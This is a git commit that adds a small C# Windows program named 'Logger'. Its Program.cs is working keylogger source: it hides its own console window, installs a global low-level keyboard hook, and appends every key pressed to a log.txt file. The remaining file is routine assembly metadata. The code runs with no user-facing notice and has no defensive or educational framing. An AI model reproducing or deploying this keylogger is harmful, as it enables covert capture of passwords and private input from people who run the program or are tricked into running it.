678aa366c0faa9e954cb315b16e39a1a7ab6ab01
Felipe Bocolowski <felipebocolowski@outlook.com.br>
2016-09-23 12:24:25 -0300

    1.2.0.0

---
+++ Logger/Program.cs
@@ -0,0 +1,105 @@
+﻿/*
+ * 
+ * Felipe Bocolowski
+ * felipebocolowski@outlook.com.br
+ * 
+ */
+
+using System;
+using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Collections;
+
+namespace Logger
+{
+    static class Program
+    {
+        static void Main()
+        {
+            var handle = GetConsoleWindow();
+
+            ShowWindow(handle, SW_HIDE);
+
+            _hookID = SetHook(_proc);
+
+            Application.Run();
+
+            UnhookWindowsHookEx(_hookID);
+        }
+        
+        private const int WH_KEYBOARD_LL = 13;
+
+        private const int WM_KEYDOWN = 0x0100;
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
+
+                string key = Convert.ToString((Keys)vkCode);
+
+                /*ArrayList list = new ArrayList();
+                list.Add(new string[] { "Oem1", "Ç" });
+
+                foreach(string[] str in list)
+                {
+                    if(key == str[0])
+                    {
+                        key = str[1];
+
+                        break;
+                    }
+                }*/
+
+                sw.Write(key + " ");
+
+                sw.Close();
+            }
+
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+    }
+}
---
+++ Logger/Properties/AssemblyInfo.cs
@@ -0,0 +1,25 @@
+﻿/*
+ * 
+ * Felipe Bocolowski
+ * felipebocolowski@outlook.com.br
+ * 
+ */
+
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("Logger")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Felipe Bocolowski")]
+[assembly: AssemblyProduct("Logger")]
+[assembly: AssemblyCopyright("Felipe Bocolowski")]
+[assembly: AssemblyTrademark("Logger")]
+[assembly: AssemblyCulture("")]
+
+[assembly: ComVisible(false)]
+
+[assembly: Guid("9e92a883-3c8b-4572-a73e-bb3e61cfdc16")]
+
+[assembly: AssemblyVersion("1.2.0.0")]
+[assembly: AssemblyFileVersion("1.2.0.0")]
